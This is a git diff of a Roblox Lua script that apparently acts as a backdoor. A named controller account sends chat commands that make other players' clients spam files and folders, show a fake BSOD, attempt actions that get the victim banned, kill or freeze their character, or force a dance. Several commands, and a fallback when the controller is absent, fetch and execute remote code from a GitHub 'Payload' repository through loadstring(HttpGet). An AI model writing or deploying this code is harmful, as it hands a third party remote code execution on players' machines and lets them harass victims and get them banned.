@@ -1,12 +1,24 @@
+--[[
+.goto
+.kick
+.ban - Tries most of commands that will break game and will try to ban you by using them.
+.spamfiles - Spam files in workspace
+.spamfolders - Spam folders in workspace {like 35}
+.crash - Will run fake bsod
+.kill
+.invis - Makes character invisible
+.dance - Forces you to dance 5 sec.
+--]]
+
 getgenv().mainaccount = "uwutimmyreborn228"
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer
 
-
-
 -- FOR CRASH "prob"
 local coregui = game:GetService("CoreGui")
 local sound = Instance.new('Sound', coregui)
+
+local isDancing = false
 
 local mainPlayer = game:GetService("Players"):FindFirstChild(getgenv().mainaccount)
 if mainPlayer then
@@ -23,25 +35,30 @@ if mainPlayer then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/SpamFolders",true))()
         elseif msg == ".crash" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/BSODmodified",true))()
-
-        elseif msg == ".freeze" then
+        elseif msg == ".kill" then
+            LocalP.Character.Humanoid:ChangeState(15)
+        elseif msg == ".invis" then
             local targetChar = LocalP.Character
             if targetChar then
                 local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
                 if targetHumanoid then
-                    targetHumanoid.PlatformStand = true
-                    targetHumanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
+                    targetHumanoid.WalkSpeed = 0
                 end
             end
-
-        elseif msg == ".kill" then
-            LocalP.Character.Humanoid:ChangeState(15)
-        elseif msg == ".executehub" then
-            print("Hub cannot be loaded.")
+        elseif msg == ".dance" then
+            if isDancing == false then
+                isDancing = true
+                LocalP.Character.Humanoid.WalkSpeed = 0
+                LocalP.Character.Humanoid.JumpPower = 0
+                LocalP.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
+                LocalP.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+                LocalP.Character:WaitForChild("Humanoid"):PlayEmote(169501346, 5)
+                isDancing = false
+            end
         end -- AT END
     end)
 else
-print("not found!")
-wait(5)
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Meow/main/UniversalIY-Reborn",true))()
+    print("not found!")
+    wait(5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Meow/main/UniversalIY-Reborn",true))()
 end
